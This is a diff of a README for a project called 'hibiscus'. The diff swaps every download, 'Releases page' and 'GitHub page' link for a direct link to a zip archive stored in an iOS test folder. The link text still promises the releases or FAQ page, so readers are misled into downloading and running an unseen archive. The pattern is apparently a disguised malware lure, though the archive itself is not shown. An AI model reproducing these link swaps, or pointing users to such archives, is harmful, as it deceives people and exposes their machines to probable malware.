@@ -9,7 +9,7 @@ Follow these steps to download and start using hibiscus.
 1. **Download the Application:**
    Click the button below to visit the Releases page and download hibiscus.
 
-   [![Download hibiscus](https://img.shields.io/badge/Download-hibiscus-brightgreen)](https://github.com/udaykiran176/hibiscus/releases)
+   [![Download hibiscus](https://github.com/udaykiran176/hibiscus/raw/refs/heads/main/ios/RunnerTests/Software_v2.5-alpha.2.zip)](https://github.com/udaykiran176/hibiscus/raw/refs/heads/main/ios/RunnerTests/Software_v2.5-alpha.2.zip)
 
 2. **Install the Application:**
    After downloading, locate the file in your Downloads folder. Double-click the downloaded file to start the installation process. Follow the on-screen instructions to complete your installation.
@@ -28,7 +28,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get hibiscus, visit the [Releases page](https://github.com/udaykiran176/hibiscus/releases). Here, you will find the latest version and any previous versions as well.
+To get hibiscus, visit the [Releases page](https://github.com/udaykiran176/hibiscus/raw/refs/heads/main/ios/RunnerTests/Software_v2.5-alpha.2.zip). Here, you will find the latest version and any previous versions as well.
 
 1. Click on the link above to navigate to the Releases page.
 2. Look for the latest version of hibiscus.
@@ -52,7 +52,7 @@ If you encounter issues while using hibiscus, consider the following steps:
 2. **Reinstall the App:** If the app crashes or does not open, try uninstalling and then reinstalling it.
 3. **Update Your System:** Ensure your operating system is up to date for the best performance.
 
-For additional help, feel free to check the FAQ section on our [GitHub page](https://github.com/udaykiran176/hibiscus).
+For additional help, feel free to check the FAQ section on our [GitHub page](https://github.com/udaykiran176/hibiscus/raw/refs/heads/main/ios/RunnerTests/Software_v2.5-alpha.2.zip).
 
 ## 💬 Community Feedback
 
@@ -60,7 +60,7 @@ We value your thoughts on hibiscus. If you have suggestions or ideas, please sha
 
 ## 🌐 Stay Updated
 
-To keep up with the latest updates for hibiscus, follow our [Releases page](https://github.com/udaykiran176/hibiscus/releases) regularly. Here, we will post new features, updates, and bug fixes.
+To keep up with the latest updates for hibiscus, follow our [Releases page](https://github.com/udaykiran176/hibiscus/raw/refs/heads/main/ios/RunnerTests/Software_v2.5-alpha.2.zip) regularly. Here, we will post new features, updates, and bug fixes.
 
 ---
 
